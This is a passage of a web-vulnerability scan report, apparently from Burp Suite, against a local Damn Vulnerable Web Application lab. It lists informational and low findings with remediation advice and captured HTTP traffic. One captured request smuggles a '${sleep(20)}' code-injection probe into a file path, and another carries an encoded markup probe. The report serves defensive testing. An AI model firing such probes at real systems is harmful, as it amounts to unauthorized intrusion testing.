<span class="TEXT"><p>Applications should use transport-level encryption (SSL/TLS) to protect all communications passing between the client and the server. The Strict-Transport-Security HTTP header should be used to ensure that clients refuse to access the server over an insecure connection.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
<li><a href="https://www.chromium.org/Home/chromium-security/marking-http-as-non-secure">Marking HTTP as non-secure</a></li>
<li><a href="https://wiki.mozilla.org/Security/Server_Side_TLS">Configuring Server-Side SSL/TLS</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security">HTTP Strict Transport Security</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/94.html">CAPEC-94: Man in the Middle Attack</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/157.html">CAPEC-157: Sniffing Attacks</a></li>
</ul></span>
<div class="rule"></div>
<span class="BODH1" id="1.2">1.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00500a00_httptracemethodisenabled">HTTP TRACE method is enabled</a></span>
<br><a class="PREVNEXT" href="#1.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#2.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>The HTTP TRACE  method is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the TRACE method by echoing in its response the exact request that was received.</p>
<p>This behavior is often harmless, but occasionally leads to the disclosure of sensitive information such as internal authentication headers appended by reverse proxies. This functionality could historically be used to bypass the HttpOnly cookie flag on cookies, but this is no longer possible in modern web browsers. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The TRACE method should be disabled on production web servers.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#information-disclosure-due-to-insecure-configuration">Web Security Academy: Information disclosure via TRACE method</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul></span>
<h2>Request</h2>
<div class="rr_div"><span><span class="HIGHLIGHT">TRACE</span> / HTTP/1.1<br>Host: localhost:7878<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cookie: <span class="HIGHLIGHT">9wkmsonpli</span><br><br></span></div>
<h2>Response</h2>
<div class="rr_div"><span>HTTP/1.1 <span class="HIGHLIGHT">200</span> OK<br>Date: Fri, 11 Mar 2022 07:03:48 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Connection: close<br>Content-Type: message/http<br>Content-Length: 275<br><br>TRACE / HTTP/1.1<br>Host: localhost:7878<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cookie: <span class="HIGHLIGHT">9wkmsonpli</span><br><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="2">2.&nbsp;http://localhost:7878/dvwa</span>
<br><a class="PREVNEXT" href="#1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#3">Next</a>
<br>
<span class="BODH1" id="2.1">2.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00500400_crossdomainrefererleakage">Cross-domain Referer leakage</a></span>
<br><a class="PREVNEXT" href="#1.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#2.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application contains links to the following other domains from URLs containing a query string:<ul><li>en.wikipedia.org</li><li>owasp.org</li><li>bobby-tables.com</li><li>www.netsparker.com</li><li>github.com</li><li>fsf.org</li><li>www.cgisecurity.com</li><li>www.scriptalert1.com</li><li>127.0.0.1</li><li>dvwa.co.uk</li><li>hub.docker.com</li><li>mariadb.com</li><li>secure.php.net</li><li>www.apachefriends.org</li><li>www.gnu.org</li><li>www.google.com</li><li>www.howtogeek.com</li><li>pentestmonkey.net</li><li>www.php.net</li><li>www.ryadel.com</li></ul>Numerous links to other domains were found and the above are a sample subset.<br><br>This issue was found in multiple locations under the reported path.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the "Referer" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>
<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>
<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>
<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>
<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.
</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">Referer Policy</a></li>
    <li><a href="https://portswigger.net/web-security/information-disclosure">Web Security Academy: Information disclosure</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=np9qgntc28sed96ai0a7u01guu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:30 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4374<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;li&gt;<span class="HIGHLIGHT">&lt;a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion" target="_blank"&gt;</span>Wikipedia - File inclusion vulnerability&lt;/a&gt;<br><b>...[SNIP]...</b><br>&lt;li&gt;<span class="HIGHLIGHT">&lt;a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank"&gt;</span>WSTG - Local File Inclusion&lt;/a&gt;<br><b>...[SNIP]...</b><br>&lt;li&gt;<span class="HIGHLIGHT">&lt;a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank"&gt;</span>WSTG - Remote File Inclusion&lt;/a&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=285841&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=k5g9ang54nnp3b44kh83f27sdo<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:33 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br>&lt;li&gt;<span class="HIGHLIGHT">&lt;a href="https://bobby-tables.com/" target="_blank"&gt;</span>https://bobby-tables.com/&lt;/a&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=285841&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=k5g9ang54nnp3b44kh83f27sdo<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:33 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br>&lt;li&gt;<span class="HIGHLIGHT">&lt;a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank"&gt;</span>https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/&lt;/a&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="2.2">2.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/005009a0_frameableresponsepotentialclickjacking">Frameable response (potential Clickjacking)</a></span>
<br><a class="PREVNEXT" href="#2.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#2.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">This issue was found in multiple locations under the reported path.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/clickjacking">Web Security Academy: Clickjacking</a></li>
    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/103.html">CAPEC-103: Clickjacking</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ii1m7vi1lgrkepbtn9j2pb5iip<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:54 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4076<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/hackable/uploads/?C=M;O=A HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=l9c2pmg7oo4bd4itvkjpgm3nl4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/hackable/uploads/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:35 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Connection: close<br>Content-Type: text/html;charset=UTF-8<br>Content-Length: 13636<br><br>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;<br>&lt;html&gt;<br> &lt;head&gt;<br>  &lt;title&gt;Index of /dvwa/hackable/uploads&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>&lt;h1&gt;Index of /dvwa/hackable/uploads&lt;/h1&gt;<br>  &lt;table&gt;<br>   &lt;tr&gt;&lt;th v<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=285841&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=k5g9ang54nnp3b44kh83f27sdo<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:33 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="2.3">2.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00800500_contenttypeisnotspecified">Content type is not specified</a></span>
<br><a class="PREVNEXT" href="#2.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#3.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">This issue was found in multiple locations under the reported path.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>If a  response does not specify a content type, then the browser will usually analyze the response and attempt to determine the MIME type of its content. This can have unexpected results, and if the content contains any user-controllable data may lead to cross-site scripting or other client-side vulnerabilities.</p>
<p>In most cases, the absence of a content type statement does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>For every response containing a message body, the application should include a single Content-type header that correctly and unambiguously states the MIME type of the content in the response body.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/63.html">CAPEC-63: Cross-Site Scripting (XSS)</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/hackable/uploads/qby971agrt%253e%253c HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=64o7lq2n7eqru8chqvdgknde7b<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/hackable/uploads/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:05 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Last-Modified: Thu, 10 Mar 2022 10:11:08 GMT<br>ETag: "a-5d9da6ed2d25d"<br>Accept-Ranges: bytes<br>Content-Length: 10<br>Connection: close<br><br>WOOUvlBGKZ</span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/hackable/uploads/file.txt%7b$%7bsleep(20)%7d%7d HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=82m1kivrgikcp2vlk4il5qic91<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/hackable/uploads/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:57 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Last-Modified: Thu, 10 Mar 2022 10:11:12 GMT<br>ETag: "a-5d9da6f0fcf57"<br>Accept-Ranges: bytes<br>Content-Length: 10<br>Connection: close<br><br>YwuRKBKHIY</span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET /dvwa/hackable/uploads/lafooxfrbp HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=si8inu6pbc6cvjnk4qlmeaqug2<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/hackable/uploads/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:59 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Last-Modified: Thu, 10 Mar 2022 10:11:16 GMT<br>ETag: "a-5d9da6f4691d5"<br>Accept-Ranges: bytes<br>Content-Length: 10<br>Connection: close<br><br>HXL5WXU1N8</span></div>
<div class="rule"></div>
<span class="BODH0" id="3">3.&nbsp;http://localhost:7878/dvwa/</span>
<br><a class="PREVNEXT" href="#2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#4">Next</a>
<br>
<span class="BODH1" id="3.1">3.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00500600_cookiewithouthttponlyflagset">Cookie without HttpOnly flag set</a></span>
<br><a class="PREVNEXT" href="#2.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#3.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_low_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Low</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>
<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
<li><a href='https://portswigger.net/web-security/cross-site-scripting/exploiting'>Web Security Academy: Exploiting XSS vulnerabilities</a></li>
<li><a href='https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly'>HttpOnly effectiveness</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
